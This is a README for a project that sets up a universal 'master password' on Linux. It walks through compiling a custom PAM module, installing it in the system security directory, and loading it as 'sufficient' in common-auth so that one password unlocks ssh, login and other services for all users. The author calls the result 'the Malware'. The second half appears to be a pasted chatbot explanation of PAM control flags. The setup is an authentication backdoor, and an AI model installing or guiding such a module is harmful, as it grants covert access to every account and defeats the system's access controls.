# Master-Password-Linux

This git repository contains and C code for the Master-Password for Linux

We will be manipulating PAM module in order to set a master password.

#Scope: Having a one master password for all Users

After you clone the repo and have the C file, follow the steps to set it up:
1. sudo apt-get install libpam0g-dev gcc make
2. gcc -fPIC -fno-stack-protector -c my_module.c
3. sudo ld -x --shared -o /lib/x86_64-linux-gnu/security/pam_mymodule.so my_module.o [This location is specifically for Ubuntu machine. Research the pam_modules folder for other distribution]


After following the above steps, you have finally got the Malware in a form of pam_module. Now only step is to load this module to PAM configuration.

Now there are various service where you can load the mpdule, but if you read the config files for services [ssh, login] under the folder /etc/pam.d, then you will notice that all of the service use the @include common-auth config file to import the 
authentication configuration. So, it is better to put in common-auth, so it will aumcatically affect all servicew which uses common-auth.

Now put the following configuration on the top. If you have the first auth as [nullok] then put it above it:

auth sufficient pam_mymodule.so

-------------------------
Certainly. The PAM (Pluggable Authentication Modules) system in Linux uses a flexible and modular approach to authentication. Each authentication-related task can involve one or more modules, and the order and behavior of these modules are defined in configuration files (e.g., /etc/pam.d/common-auth).

In these configuration files, each module can have a control flag associated with it. Some common control flags include:

required: The module must pass for authentication to succeed. If the module fails, the user is not immediately notified; instead, other modules are checked as well. However, the final result will be a failure, even if subsequent modules succeed.

requisite: Like required, but if this module fails, the user is immediately notified and no further modules are checked.

sufficient: If this module succeeds, authentication succeeds immediately, and no further modules are checked. If the module fails, the system falls through and checks the next module (this is like a short-circuit on success).

optional: The module is not critical for authentication. If it's the only one left to be checked and it fails, authentication will fail. But if there are other modules after it, their result can affect the final authentication decision.

In the context of your task:

If you set the control flag for your custom module to sufficient in common-auth:

When a user tries to log in:
PAM will check your custom module first.
If the user provides the master password, your module will report success, and due to the sufficient keyword, PAM will grant access without checking subsequent modules.
If the user provides their own password and it does not match the master password, your module will report failure. PAM will then move on to the next module in line (usually pam_unix.so) to check the user's individual password against the password in /etc/shadow.
If the user's password matches, the pam_unix.so module will report success, and the user will be authenticated. If it doesn't match, the user will not be authenticated.
It's a cascading mechanism, where each module can give a verdict, but whether that verdict is final or not depends on the control flag in front of it. With sufficient, it's like saying, "If this module is happy, don't worry about the rest."









